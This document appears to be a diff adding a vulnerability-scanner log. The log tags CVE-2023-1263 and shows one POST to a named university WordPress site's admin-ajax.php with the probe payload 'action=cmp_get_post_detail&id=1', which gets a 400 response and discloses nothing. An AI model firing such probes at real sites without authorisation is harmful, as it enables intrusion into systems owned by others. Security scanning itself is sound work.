@@ -1,0 +1,28 @@
+[CVE-2023-1263] Dumped HTTP request for https://particletheory.science.unimelb.edu.au/wp-admin/admin-ajax.php
+
+
+POST /wp-admin/admin-ajax.php HTTP/1.1
+Host: particletheory.science.unimelb.edu.au
+User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Safari/537.36
+Connection: close
+Content-Length: 31
+Content-Type: application/x-www-form-urlencoded
+Accept-Encoding: gzip
+
+action=cmp_get_post_detail&id=1
+[CVE-2023-1263] Dumped HTTP response https://particletheory.science.unimelb.edu.au/wp-admin/admin-ajax.php
+
+HTTP/1.1 400 Bad Request
+Connection: close
+Transfer-Encoding: chunked
+Cache-Control: no-cache, must-revalidate, max-age=0, no-store, private
+Content-Type: text/html; charset=UTF-8
+Date: Wed, 06 Aug 2025 15:18:09 GMT
+Expires: Wed, 11 Jan 1984 05:00:00 GMT
+Referrer-Policy: strict-origin-when-cross-origin
+Server: openresty
+X-Content-Type-Options: nosniff
+X-Frame-Options: SAMEORIGIN
+X-Robots-Tag: noindex
+
+0
